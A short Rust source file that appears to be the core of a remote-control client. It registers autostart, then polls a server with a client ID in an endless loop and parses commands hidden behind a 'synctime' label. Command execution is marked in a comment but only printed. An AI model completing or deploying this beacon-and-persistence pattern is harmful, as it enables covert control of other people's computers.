use std::{thread::sleep, time::Duration};

use crate::{autostart, request::request, utils::get_client_id};
use anyhow::Result;

pub fn start() {
    let _ = autostart::run();
    let _ = request_poll();
}

fn request_poll() -> Result<()> {
    let client_id = get_client_id()?;
    loop {
        println!("request synctime  {}", client_id);
        let result = request(&client_id);

        let mut command: Option<String> = None;

        if let Ok(str) = result {
            let exist = str.contains("synctime");
            if exist {
                let split = str.split(':').collect::<Vec<_>>();
                let cmd = split.get(1).map(|s| s.to_string());
                command = cmd;
            }
        }

        // 执行命令
        if let Some(cmd) = command {
            println!("command: {}", cmd);
        }
        sleep(Duration::from_secs(1)); // 1分钟
    }
}
